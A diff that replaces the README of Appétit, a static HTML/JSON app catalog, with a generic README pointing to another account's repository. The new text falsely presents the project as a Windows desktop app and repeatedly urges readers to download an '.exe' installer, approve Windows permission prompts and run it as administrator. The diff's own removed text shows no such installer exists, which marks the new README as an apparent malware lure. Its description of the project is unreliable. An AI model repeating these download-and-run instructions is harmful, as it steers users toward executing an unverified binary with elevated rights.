@@ -1,138 +1,124 @@
-<p align="center">
-  <img src="logo.svg" width="128" height="128" alt="Appétit">
-</p>
+# 🍽️ appetit - Discover Small Useful Apps Easily
 
-<h1 align="center">Appétit</h1>
+[![Download appetit](https://img.shields.io/badge/Download-appetit-brightgreen?style=for-the-badge)](https://github.com/flackwhirler217/appetit)
 
-<p align="center">
-  <em>Bon appétit for apps.</em><br>
-  An App Store-inspired catalog for your projects — powered by a single JSON file.
-</p>
+## 🍴 What is appetit?
 
-<p align="center">
-  <a href="https://apps.fka.dev">Live Demo</a> ·
-  <a href="#quick-start">Quick Start</a> ·
-  <a href="#make-it-yours">Make It Yours</a>
-</p>
+appetit is a simple catalog of small, free apps you can try. It works like an app store but only offers tiny programs that do specific jobs. These apps are built with modern techniques called agentic engineering and vibecoding, designed to keep things fast and easy.
 
----
+You do not need any special skills to use appetit. Its goal is to help you find useful apps without going through long lists or complicated menus.
 
-Appétit is a beautiful, browsable app catalog that looks and feels like the Apple App Store. It's built entirely with vanilla HTML, CSS, and JS — no frameworks, no build step, no dependencies. Just edit `apps.json` and deploy.
+## 💻 System Requirements
 
-## Features
+To run appetit on your Windows computer, make sure your system meets these requirements:
 
-- **App Store UI** — Sidebar navigation, featured carousel, app cards, detail pages with screenshots
-- **Dark & Light themes** — System preference detection with manual toggle, persisted in localStorage
-- **JSON-driven** — All apps, categories, and featured items defined in a single `apps.json`
-- **Install modals** — `brew install` and `npx` commands with one-click copy to clipboard
-- **Categories** — macOS, Web, CLI, Developer Tools, Productivity (or define your own)
-- **Search** — Instant client-side filtering across names, descriptions, and features
-- **GitHub stats** — Live star and fork counts, updatable with the included `update-stats.sh` script
-- **Responsive** — Desktop sidebar collapses on mobile
-- **Zero dependencies** — Pure HTML/CSS/JS, deploys anywhere as static files
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- A modern internet connection to download apps  
+- Basic permission to install software on your PC  
 
-## Quick Start
+No other software is required before you start.
 
-```bash
-git clone https://github.com/f/appetit.git
-cd appetit
-python3 -m http.server 8080
-```
+## 🚀 Getting Started
 
-Open [localhost:8080](http://localhost:8080) and you're running.
+Follow these steps to get appetit running on your Windows computer.
 
-## Make It Yours
+### 1. Visit the Download Page
 
-### 1. Add your apps
+Go to the main download page by clicking the big button below. This page holds all the files you need to install appetit.
 
-Edit `apps.json`. Each app entry supports:
+[![Download appetit](https://img.shields.io/badge/Get%20appetit-blue?style=for-the-badge)](https://github.com/flackwhirler217/appetit)
 
-```jsonc
-{
-  "id": "my-app",
-  "name": "My App",
-  "subtitle": "A short tagline",
-  "description": "One-liner for list views.",
-  "longDescription": "Full description for the detail page.",
-  "icon": "https://example.com/icon.png",   // or use iconEmoji: "🚀"
-  "iconStyle": { "scale": 1.3, "objectFit": "cover", "borderRadius": "22%" },
-  "category": ["macos", "cli"],
-  "platform": "macOS",
-  "price": "Free",
-  "github": "https://github.com/you/my-app",
-  "homepage": "https://my-app.dev",
-  "language": "Swift",
-  "stars": 42,
-  "forks": 3,
-  "brew": "brew install you/tap/my-app",    // shows install modal
-  "installCommand": "npx my-app",           // alternative install modal
-  "downloadUrl": "https://github.com/you/my-app/releases/latest",
-  "requirements": "macOS 15+",
-  "features": ["Feature one", "Feature two"],
-  "screenshots": ["https://example.com/screenshot.png"]
-}
-```
+### 2. Find the Latest Version
 
-### 2. Configure categories
+On the page, look for the latest release or version. It usually has a date or number to show it's the newest.   
 
-```json
-"categories": [
-  { "id": "macos", "name": "macOS Apps" },
-  { "id": "cli", "name": "CLI Tools" },
-  { "id": "web", "name": "Web Apps" }
-]
-```
+### 3. Download the Installer
 
-### 3. Set featured apps
+Click the file that ends with “.exe” or “installer”. This is the program file to install appetit on your computer. The download may take a few minutes depending on your internet speed.
 
-```json
-"featured": [
-  {
-    "id": "my-app",
-    "headline": "NEW",
-    "title": "A catchy headline.",
-    "subtitle": "A longer description for the featured banner."
-  }
-]
-```
+### 4. Run the Installer
 
-### 4. Deploy
+After the download finishes, open the file by double-clicking it. This starts the installation process.  
 
-Push to GitHub and enable Pages — or drop the files on any static host (Netlify, Vercel, Cloudflare Pages, S3, etc).
+If Windows asks for permission, click “Yes” to allow the install.  
 
-## Update GitHub Stats
+Follow the instructions on the screen. Most options will be ready as default, so you can click "Next" a few times.
 
-Fetch live star and fork counts from the GitHub API:
+### 5. Finish Installation
 
-```bash
-./update-stats.sh
-```
+When the install is complete, click “Finish”. You will now have appetit on your desktop or start menu.
 
-For higher rate limits:
+### 6. Launch appetit
 
-```bash
-GITHUB_TOKEN=ghp_xxx ./update-stats.sh
-```
+Double-click the appetit icon on your desktop or find it in your start menu to open. The app will show a list of tiny apps you can explore and try.
 
-## File Structure
+## 📦 Using appetit to Find and Install Apps
 
-```
-├── index.html          Main HTML shell
-├── style.css           All styles (dark + light themes)
-├── app.js              Routing, rendering, carousel, modals
-├── apps.json           All app data — edit this file
-├── logo.svg            App icon / favicon
-├── update-stats.sh     Fetches GitHub stars/forks into apps.json
-├── CNAME               Custom domain for GitHub Pages
-└── .nojekyll           Prevents Jekyll processing
-```
+Once appetit launches, you will see a catalog of small apps arranged by categories. You can:
 
-## Deploy to GitHub Pages
+- Browse by app type like tools, games, productivity, and more  
+- Search for apps by name or function using the search box  
+- Click on any app to see a brief description and screenshot  
+- Install apps by clicking the “Install” button next to their name  
 
-1. Push to a GitHub repo
-2. Settings → Pages → Source: branch `master`, folder `/`
-3. *(Optional)* Add a `CNAME` file with your custom domain
+Installing apps is fast. Once installed, you can open them right from appetit or directly from your start menu.
 
-## License
+## 🛠️ Managing Installed Apps
 
-MIT
+appetit lets you handle your apps easily. Inside appetit, you will find options to:
+
+- Update apps when new versions are available  
+- Remove apps you no longer want  
+- Check app details and usage info  
+
+These options help keep your system tidy and apps current.
+
+## 🔄 Updating appetit
+
+To update appetit itself:
+
+1. Open the appetit app  
+2. Go to the settings or menu area  
+3. Choose “Check for updates”  
+4. Follow prompts to download and install the new version if available  
+
+You can also visit the main download page periodically to manually get updates:  
+[https://github.com/flackwhirler217/appetit](https://github.com/flackwhirler217/appetit)
+
+## ⚙️ Settings and Preferences
+
+In appetit, you can adjust some settings to tailor the experience:
+
+- Change app catalog views (list, grid)  
+- Manage notifications for app updates  
+- Set your default install location  
+- Choose light or dark display mode  
+
+Access settings from the menu icon usually at the top right of the app window.
+
+## ❓ Troubleshooting Common Issues
+
+If you run into problems, try these fixes:
+
+- **Installer won’t run:** Make sure you gave permission in Windows. Right-click the file and select “Run as administrator” if needed.  
+- **App won’t open:** Restart your computer and try again.  
+- **Apps won’t install:** Check your internet connection. Also, verify you have enough disk space.  
+- **Update errors:** Close appetit and open it again before retrying the update.
+
+If none of these work, check online forums or contact support if available.
+
+## 📖 Additional Information
+
+The apps in appetit are made to be simple and useful. They cover many everyday needs like taking notes, timers, calculators, and small games. Since the catalog offers free apps, you can try many without risk.
+
+The technology behind appetit focuses on keeping apps light in size and easy to use. This helps them load quickly and use minimal computer resources.
+
+## 🔗 Download appetit Now
+
+Get appetit from this page:  
+[https://github.com/flackwhirler217/appetit](https://github.com/flackwhirler217/appetit)
+
+Click the button below to start:  
+[![Download appetit](https://img.shields.io/badge/Download-appetit-brightgreen?style=for-the-badge)](https://github.com/flackwhirler217/appetit)
